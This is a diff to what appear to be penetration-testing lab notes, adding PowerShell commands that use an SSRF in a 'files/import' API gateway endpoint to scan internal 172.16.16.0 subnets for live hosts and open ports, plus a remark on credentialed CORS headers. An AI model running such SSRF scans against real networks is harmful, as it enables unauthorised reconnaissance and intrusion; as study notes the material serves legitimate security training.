@@ -36,4 +36,19 @@ sudo systemctl status apache
 sudo tail /var/log/apache2/access.log -f
 ```
 
-One thing also worth mentioning is that 'Access-Control-Allow-Credentials' is set on file/import and almost every other endpoing we bruteforcedsudo tail /var/log/apache2/access.log -f
+One thing also worth mentioning is that 'Access-Control-Allow-Credentials' is set on file/import and almost every other endpoing we bruteforced 
+```bash
+sudo tail /var/log/apache2/access.log -f
+```
+
+We can scan a list of gateways with:
+```powershell
+Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -NetworkAddress '172.16.16.0/22' -Ports 8000 -Gateway
+```
+We can detect all of the live hosts and scan ports within the '172.16.16.0/28' range (/28 gives us the first 15 ip addresses, /29 gives the first 6)
+```powershell
+Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -NetworkAddress '172.16.16.0/28' -Hosts -Open
+```
+```powershell
+Invoke-SSRFGatewayScan -Target http://apigateway:8000/files/import -NetworkAddress '172.16.16.0/29' -Ports 8000 -Hosts -Open
+```
